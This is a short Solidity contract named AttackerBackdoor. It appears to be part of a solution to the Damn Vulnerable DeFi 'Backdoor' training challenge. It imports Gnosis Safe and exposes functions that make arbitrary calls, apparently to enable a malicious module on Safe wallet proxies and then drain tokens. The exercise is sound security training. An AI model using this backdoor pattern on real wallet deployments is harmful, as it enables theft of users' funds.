pragma solidity >=0.8;
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../../DamnValuableToken.sol";
contract AttackerBackdoor {
    function enableModuleOnProxy(bytes memory data) external {
        address(this).call(data);
    }

    function exploit(address to, bytes memory data) external {
        to.call(data);
    }
        
}